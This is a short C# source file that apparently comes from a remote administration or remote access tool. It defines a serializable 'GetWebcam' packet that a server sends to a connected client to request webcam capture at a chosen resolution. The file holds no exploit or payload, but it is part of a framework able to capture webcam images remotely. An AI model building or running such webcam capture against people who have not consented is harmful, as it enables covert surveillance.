using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetWebcam : IPacket
    {
        public int Webcam { get; set; }
        public int Resolution { get; set; }

        public GetWebcam()
        {
        }

        public GetWebcam(int webcam, int resolution)
        {
            this.Webcam = webcam;
            this.Resolution = resolution;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}